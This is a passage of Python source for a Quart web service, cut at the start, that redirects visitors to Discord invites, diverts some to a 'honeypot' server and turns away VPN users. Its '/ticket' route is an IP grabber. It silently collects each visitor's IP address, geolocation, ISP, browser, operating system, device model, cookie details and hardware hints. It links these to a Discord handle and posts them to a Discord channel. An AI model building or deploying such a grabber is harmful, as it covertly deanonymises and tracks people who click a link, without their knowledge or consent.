🏳️ **Country:** {country_code}
🔗 **Honeypot:** {honeypot}

📱 **Device Information:**
• **Browser:** {device_info['browser_family']} {device_info['browser_version']}
• **OS:** {device_info['os_family']} {device_info['os_version']}
• **Device:** {device_info['device_family']} ({device_info['device_brand']} {device_info['device_model']})
• **Type:** {'📱 Mobile' if device_info['is_mobile'] else '💻 Desktop' if device_info['is_pc'] else '📟 Tablet' if device_info['is_tablet'] else '🤖 Bot' if device_info['is_bot'] else 'Unknown'}

🌍 **Network Details:**
• **Language:** {device_info['accept_language']}
• **Referer:** {device_info['referer']}
• **User Agent:** {device_info['user_agent_string'][:100]}...
• **Time:** {device_info['access_time']}

🔗 **More info:** https://iplocation.com/?ip={ip}
'''

        # Create and send embed message
        embed = create_honeypot_embed(ip, country_code, honeypot, device_info)
        send_to_channel(None, embed)

        return redirect(honeypot)
    elif await check_for_vpn(ip):
        return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to join the Discord.'
    
    else:
        l.info(f"Rediredcting to: {normal_server}")
        return redirect(normal_server)

@app.route('/')
async def index():
    l.info('Default route called.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    try:
        return await redirect_handler(ip_address, default_server, alternative_server_url, request)
    except Exception as e:
        l.error(f'{e}')
        
@app.route('/health')
async def health():
    l.info('Health route called.')
    return 200
        
@app.route('/ticket/<path:dc_handle>')
async def ip_grab(dc_handle):
    l.info('Grabber called.')
    l.info(f'user is: {dc_handle}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    vpn = await check_for_vpn(ip_address)

    # Extract comprehensive device information
    device_info = extract_device_info(request)

    try:
        data = await request_ip_location(ip_address)
        ip = data['ip']
        ip_number = data['ip_number']
        ip_version = data['ip_version']
        country_name = data['country_name']
        country_code2 = data['country_code2']
        isp = data['isp']

        l.info(f'IP data: {data}\nVPN: {vpn}')
        l.info(f'Device info: {device_info}')

        # Enhanced Discord message with device information
        cookie_info = ""
        if device_info['cookie_count'] > 0:
            cookie_info = f"\n🍪 **Cookie Information:**\n• **Count:** {device_info['cookie_count']}\n• **Session Cookies:** {'Yes' if device_info['has_session_cookies'] else 'No'}\n• **Tracking Cookies:** {'Yes' if device_info['has_tracking_cookies'] else 'No'}"

        hardware_info = ""
        if device_info['sec_ch_device_memory'] != 'Unknown' or device_info['sec_ch_dpr'] != 'Unknown':
            hardware_info = f"\n⚙️ **Hardware Details:**\n• **Device Memory:** {device_info['sec_ch_device_memory']} GB\n• **Screen DPR:** {device_info['sec_ch_dpr']}\n• **Architecture:** {device_info['sec_ch_ua_arch']}"

        # Create and send embed message with button
        event_id = str(int(datetime.now().timestamp()))
        device_data_store[event_id] = device_info

        embed = create_ip_grabber_embed(dc_handle, ip_address, vpn, country_name, country_code2, isp, device_info)

        # Send initial summary embed, then follow up with verbose details
        send_to_channel(None, embed)

        # Send verbose embed as follow-up message
        verbose_embed = create_verbose_embed(device_info, "IP_GRABBER")
        send_to_channel("📋 **Detailed Analysis:**", verbose_embed)

        if vpn:
            return 'You seem to access the link using a VPN. To ensure a secure experience for all our users, please disable the VPN and retry to create a ticket.'

        dc_handle += '?'
        return await render_template('result.html',
                                   dc_handle=dc_handle,
                                   ip=ip,
                                   ip_number=ip_number,
                                   ip_version=ip_version,
                                   country_name=country_name,
                                   country_code2=country_code2,
                                   isp=isp,
                                   device_info=device_info)
    except Exception as e:
        l.error(f'{e}')
    return
   
@app.route('/<path:dc_invite>')
async def refer(dc_invite):
    l.info('Custom route called.')
    l.info(f'Route is: {dc_invite}')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    custom_server = f'https://discord.gg/{dc_invite}'
    try:
        return await redirect_handler(ip_address, custom_server, alternative_server_url, request)
    except Exception as e:
            l.error(f'{e}')
    
@app.route('/<path:dc_invite>/<path:honeypot>')
async def refer_custom(dc_invite, honeypot):
    l.info('Custom route called with custom honeypot.')
    ip_address = request.headers.get('X-Real-IP')
    l.info(f'IP Address is: {ip_address}')
    l.info(f'Route is: {dc_invite}/{honeypot}')
    custom_server = f'https://discord.gg/{dc_invite}'
    custom_honeypot = f'https://discord.gg/{honeypot}'
    try:
        return await redirect_handler(ip_address, custom_server, custom_honeypot, request)
    except Exception as e:
            l.error(f'{e}')

# Route for serving favicon.ico
@app.route('/favicon.ico')
async def favicon():
    return await send_file('favicon.ico')

if __name__ == '__main__':
    
    try:
        config = read_json_file('config.json')
    except FileNotFoundError as e:
        l.error(e)
        l.passing('Trying to gather config from env vars')
        config = get_env_vars()
        l.console_log(config)
    sub_nets = read_subnets_from_file('ipv4.txt') # txt file courtesy of https://github.com/X4BNet/lists_vpn
    test_flag = config['test_flag']
    redirected = False
    if test_flag:
        l.passing('Test flag is set, every second request will be directed to the honey pot')
    default_server = config['default_server']

    alternative_server_url = config['honeypot_server']
    
    app_port = int(config['app_port'])
    
    
    app.run(host='0.0.0.0',port = app_port)